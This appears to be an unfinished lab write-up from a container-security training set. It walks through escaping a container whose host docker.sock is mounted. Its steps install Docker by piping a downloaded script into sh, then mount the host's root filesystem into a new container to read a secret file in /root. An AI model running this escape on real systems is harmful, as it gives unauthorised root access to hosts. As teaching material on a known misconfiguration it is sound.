# Docker Daemon Direct Access

---

    * A malicious user who gains access to a container where the `docker.sock` of host machine is exposed, can gain access to the host machine.

Steps:

    Pre-Steps to be done?? @tilak
    1. Run the shellshock / vul_flask docker and volume expose. Launch another malicious container through that and gain access to host..

    
Step 1. Gain access(RCE) to a vulnerable container where host machines' `docker.sock` is exposed or just run a container with volume exposed docker.sock
    a. Run `docker run -ti -v /var/run/docker.sock:/var/run/docker.sock ubuntu:16.04`
    
        Screenshot here
        
Step 2: Install docker-engine by running `apt-get update && apt-get install wget -y && wget -qO- https://get.docker.com | sh`.
    
        Screenshot here
        
Step 3: Once docker is installed, run `docker run -ti -v /:/hostFS/ ubuntu:16.04 /bin/bash`
    
        Screenshot here

Step 4: The `secret` file will now be accessible by the malicious user at `/hostFS/root/`
    
        Screenshot here

Step 5: Malicious user now has complete access to the root Filesystem of the host machine.

        Screenshot here
